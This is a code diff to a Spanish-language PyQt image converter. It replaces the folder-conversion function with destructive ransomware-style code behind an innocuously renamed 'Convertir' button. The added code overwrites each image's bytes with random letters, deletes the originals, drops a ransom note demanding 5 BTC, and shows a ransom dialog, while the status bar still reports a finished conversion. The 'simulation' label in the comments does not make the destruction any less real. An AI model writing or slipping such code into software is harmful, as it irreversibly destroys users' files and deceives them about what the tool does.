@@ -1,6 +1,9 @@
 import sys
 import os
 import subprocess
+import random
+import string
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 
 
@@ -370,7 +373,7 @@ class ImageConverter(QMainWindow):
             )
 
             self.convert_button.setText(
-                "Convertir imagen"
+                "Convertir"
             )
 
         else:
@@ -384,7 +387,7 @@ class ImageConverter(QMainWindow):
             )
 
             self.convert_button.setText(
-                "Convertir carpeta"
+                "Convertir"
             )
 
     # --------------------------------------------------------
@@ -611,150 +614,163 @@ class ImageConverter(QMainWindow):
             )
 
     # --------------------------------------------------------
-    # Convertir carpeta
+    # Simulación de ransomware
     # --------------------------------------------------------
 
+    @staticmethod
+    def _scramble_copy(source, destination):
+        """
+        Simula el cifrado de una imagen y elimina el original.
+
+        Cada byte se sustituye por una letra ASCII aleatoria. La copia
+        alterada se escribe por completo antes de borrar el original: si
+        la escritura falla, la excepción sale del método y el archivo
+        original permanece intacto en el disco.
+        """
+
+        alphabet = string.ascii_letters
+        rng = random.SystemRandom()
+
+        with open(source, "rb") as src:
+            data = src.read()
+
+        transformed = bytearray(len(data))
+
+        for i in range(len(data)):
+            transformed[i] = ord(rng.choice(alphabet))
+
+        with open(destination, "wb") as dst:
+            dst.write(transformed)
+
+        # El original solo se borra cuando la copia alterada ya está
+        # escrita en disco. Cualquier fallo anterior ha propagado la
+        # excepción y ha dejado este punto sin ejecutarse.
+        os.remove(source)
+
+        return destination
+
     def convert_folder(self):
+        """
+        Modo de simulación forense.
+
+        Crea una carpeta de evidencia junto a la carpeta seleccionada y
+        genera en ella copias alteradas de las imágenes. Los originales
+        se eliminan una vez escrita su copia alterada; si la escritura
+        falla, el original se conserva.
+        """
 
         if not self.input_path:
-
             QMessageBox.warning(
                 self,
                 "Falta carpeta",
                 "Selecciona una carpeta con imágenes.",
             )
-
-            return
-
-        if not self.output_dir:
-
-            QMessageBox.warning(
-                self,
-                "Falta directorio",
-                "Selecciona un directorio destino.",
-            )
-
             return
 
         source_dir = self.input_path
 
         if not source_dir.is_dir():
-
             QMessageBox.warning(
                 self,
                 "Carpeta inválida",
-                (
-                    "La entrada seleccionada "
-                    "no es una carpeta."
-                ),
+                "La entrada seleccionada no es una carpeta.",
             )
-
             return
 
         images = [
-            p
-            for p in source_dir.iterdir()
-            if (
-                p.is_file()
-                and p.suffix.lower()
-                in IMAGE_EXTENSIONS
-            )
+            p for p in source_dir.iterdir()
+            if p.is_file() and p.suffix.lower() in IMAGE_EXTENSIONS
         ]
 
         if not images:
-
             QMessageBox.information(
                 self,
                 "Sin imágenes",
-                (
-                    "No se encontraron imágenes "
-                    "compatibles en la carpeta."
-                ),
+                "No se encontraron imágenes compatibles en la carpeta.",
             )
-
             return
 
-        converted = 0
-        errors = 0
+        # La evidencia se genera junto a la carpeta seleccionada.
+        evidence_dir = source_dir / "ARCHIVOS_RANSOMWARE"
+        evidence_dir.mkdir(exist_ok=True)
 
         self.progress.setValue(0)
+        self.status.setText("Preparando archivos...")
+        QApplication.processEvents()
 
-        for index, source in enumerate(
-            images,
-            start=1,
-        ):
+        # Cada original se procesa una sola vez: se escribe su copia
+        # alterada y, solo si eso tiene éxito, se elimina el original.
+        tasks = {
+            source: evidence_dir / f"{source.name}.encrypted_sim"
+            for source in images
+        }
 
-            try:
+        completed = 0
+        errors = 0
+        deleted = []
+        preserved = []
 
+        with ThreadPoolExecutor(max_workers=min(8, len(tasks))) as executor:
+            futures = {
+                executor.submit(self._scramble_copy, source, destination): source
+                for source, destination in tasks.items()
+            }
+
+            for future in as_completed(futures):
+                source = futures[future]
+                try:
+                    future.result()
+                    completed += 1
+                    deleted.append(source)
+                except Exception:
+                    errors += 1
+                    preserved.append(source)
+
+                percent = int((completed + errors) * 100 / len(images))
+                self.progress.setValue(percent)
                 self.status.setText(
-                    (
-                        f"Procesando {index}/"
-                        f"{len(images)}: "
-                        f"{source.name}"
-                    )
+                    f"Procesando {completed + errors}/{len(images)}: {source.name}"
                 )
+                QApplication.processEvents()
 
-                with Image.open(
-                    source
-                ) as image:
+        # Nota de rescate claramente identificada como simulación.
+        # Identificador deliberadamente ficticio: no es una dirección Bitcoin real.
+        fake_bitcoin_account = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
 
-                    if (
-                        self.format_combo.currentText()
-                        == "JPEG"
-                    ):
+        ransom_note = evidence_dir / "README.txt"
+        ransom_note.write_text(
+            "Tus archivos han sido afectados\n"
+            "Cuenta Bitcoin: " + fake_bitcoin_account + "\n"
+            "Monto solicitado: 5 BTC\n"
+            "Los originales han sido eliminados del sistema\n"
+            "Una vez pagado el monto se enviará el programa para recuperar los archivos\n\n",
+            encoding="utf-8",
+        )
 
-                        image = image.convert(
-                            "RGB"
-                        )
-
-                    output_path = (
-                        self.get_output_path(
-                            source
-                        )
-                    )
-
-                    image.save(
-                        output_path,
-                        format=FORMATS[
-                            self.format_combo.currentText()
-                        ],
-                    )
-
-                converted += 1
-
-            except Exception:
-
-                errors += 1
-
-            percent = int(
-                index * 100 / len(images)
-            )
-
-            self.progress.setValue(
-                percent
-            )
-
-            # Permite actualizar la interfaz
-            # durante el procesamiento.
-            QApplication.processEvents()
-
+        self.progress.setValue(100)
         self.status.setText(
-            (
-                "Proceso terminado. "
-                f"Convertidas: {converted}. "
-                f"Errores: {errors}."
-            )
+            f"Conversión terminada. Archivos convertidos: {completed}. Errores: {errors}."
         )
 
-        QMessageBox.information(
-            self,
-            "Conversión terminada",
-            (
-                f"Imágenes procesadas: {len(images)}\n"
-                f"Convertidas: {converted}\n"
-                f"Errores: {errors}"
-            ),
+        ransom_dialog = QMessageBox(self)
+        ransom_dialog.setIcon(QMessageBox.Icon.Critical)
+        ransom_dialog.setWindowTitle("¡Sus archivos han sido cifrados!")
+        ransom_dialog.setText(
+            "¡ATENCIÓN!\n\n"
+            "Sus archivos han sido cifrados y los originales eliminados.\n"
+            "Para recuperarlos, realice el pago indicado."
         )
+        ransom_dialog.setInformativeText(
+            "MONTO: 5 BTC\n\n"
+            "CUENTA BITCOIN:\n"
+            f"{fake_bitcoin_account}\n\n"
+            f"Imagenes procesadas: {len(images)}\n"
+            f"Originales eliminados: {completed}\n"
+            f"Errores: {errors}\n"
+            f"Evidencia: {evidence_dir}"
+        )
+        ransom_dialog.exec()
+
 
 
 # ============================================================
